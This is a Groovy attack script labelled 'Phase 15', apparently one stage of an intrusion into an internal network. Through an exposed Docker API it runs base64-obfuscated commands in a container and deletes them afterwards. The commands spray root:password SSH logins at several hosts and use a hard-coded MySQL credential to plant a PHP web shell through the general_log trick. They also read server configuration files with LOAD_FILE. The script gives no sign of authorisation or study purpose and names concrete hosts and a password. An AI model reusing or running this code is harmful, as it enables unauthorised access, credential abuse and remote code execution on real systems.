// Phase 15: root:password SSH + MySQL general_log trick
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def bash = '''#!/bin/bash
echo "===== SSH root:password SPRAY ====="
# root@% hash *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 is KNOWN = "password"
for host in 172.27.141.24 172.27.141.6 172.27.141.4 172.27.141.5; do
    result=$(curl -sS --connect-timeout 3 -u "root:password" sftp://$host/ 2>&1 | head -3)
    rc=$?
    if [ $rc -eq 0 ]; then
        echo "*** ROOT_SSH_OK *** root:password @ $host"
        echo "$result"
    else
        echo "SSH_FAIL|root:password|$host|rc=$rc|${result:0:80}"
    fi
done

echo ""
echo "===== MYSQL GENERAL LOG TRICK (T1Pagos) ====="
'''

def b64_bash = bash.getBytes("UTF-8").encodeBase64().toString()

def php = '''<?php
$m = new mysqli("172.27.141.4", "adaxxidb", "JTQ6PrkecY3y1kVN", "", 3306);
if ($m->connect_error) { die("FAIL\\n"); }

echo "=== GENERAL LOG STATUS ===\\n";
$r = $m->query("SELECT @@general_log gl, @@general_log_file glf, @@log_output lo");
$row = $r->fetch_assoc();
echo "general_log=".$row["gl"]." file=".$row["glf"]." output=".$row["lo"]."\\n";

// Try to set general_log to a web-writable location
echo "\\n=== TRY SET GENERAL LOG TO /tmp ===\\n";
$m->query("SET GLOBAL general_log = OFF");
$m->query("SET GLOBAL general_log_file = '/tmp/mysql_rce.php'");
$r = $m->query("SELECT @@general_log_file glf");
$row = $r->fetch_assoc();
echo "After set: general_log_file=".$row["glf"]."\\n";

$m->query("SET GLOBAL general_log = ON");
// Execute a PHP payload as a query (will be logged)
$m->query("SELECT '<?php system(\\$_GET[\"c\"]); ?>'");
$m->query("SET GLOBAL general_log = OFF");
echo "General log payload written\\n";

// Verify the file exists
$r = $m->query("SELECT LOAD_FILE('/tmp/mysql_rce.php') AS c");
$row = $r->fetch_assoc();
if ($row["c"]) {
    echo "FILE_EXISTS|".strlen($row["c"])." bytes\\n";
    // Check if the PHP tag is in there
    if (strpos($row["c"], "<?php") !== false) {
        echo "*** PHP_PAYLOAD_CONFIRMED_IN_LOG ***\\n";
    }
} else {
    echo "FILE_NOT_FOUND\\n";
}

// Now: can we execute this? Need to find a way to include it
// Check if there is a PHP process or web server that can access /tmp
echo "\\n=== CHECK FOR LOCAL WEB SERVICES ===\\n";
// The host has nginx running? Check via LOAD_FILE
$r = $m->query("SELECT LOAD_FILE('/etc/nginx/nginx.conf') c");
$row = $r->fetch_assoc();
if ($row["c"]) { echo "NGINX_CONF:\\n".substr($row["c"], 0, 1000)."\\n"; }
else { echo "nginx.conf: NOT_FOUND\\n"; }

$r = $m->query("SELECT LOAD_FILE('/etc/httpd/conf/httpd.conf') c");
$row = $r->fetch_assoc();
if ($row["c"]) { echo "HTTPD_CONF:\\n".substr($row["c"], 0, 1000)."\\n"; }
else { echo "httpd.conf: NOT_FOUND\\n"; }

// Check common PHP-FPM configs
$configs = array("/etc/php-fpm.d/www.conf", "/etc/php-fpm.conf", "/opt/rh/php-fpm/conf.d/www.conf");
foreach ($configs as $f) {
    $r = $m->query("SELECT LOAD_FILE('".$f."') c");
    $row = $r->fetch_assoc();
    if ($row["c"]) { echo "\\nFOUND: $f\\n".substr($row["c"], 0, 500)."\\n"; }
}

$m->close();
echo "\\nPHASE15_COMPLETE\\n";
'''

def b64_php = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64_bash + " | base64 -d > /tmp/_p15.sh && bash /tmp/_p15.sh && echo " + b64_php + " | base64 -d > /tmp/_p15.php && php /tmp/_p15.php 2>&1; rm -f /tmp/_p15.sh /tmp/_p15.php"
println execIn(cmd)
